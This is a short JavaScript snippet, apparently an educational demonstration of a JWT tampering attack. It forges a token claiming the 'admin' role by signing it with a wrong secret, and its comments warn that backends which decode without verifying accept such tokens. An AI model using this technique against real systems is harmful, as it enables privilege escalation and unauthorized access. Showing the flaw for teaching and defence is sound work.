// JWT Tampering Attack
// If your backend does not verify properly → instant privilege escalation
// Many devs only decode, not verify
// Classic mistake.

const jwt = require("jsonwebtoken");

// Simulate attacker modifying payload
const fakePayload = {
  userId: 1,
  role: "admin"
};

// Signing with wrong secret
const fakeToken = jwt.sign(fakePayload, "wrong-secret");

console.log("Tampered Token:");
console.log(fakeToken);
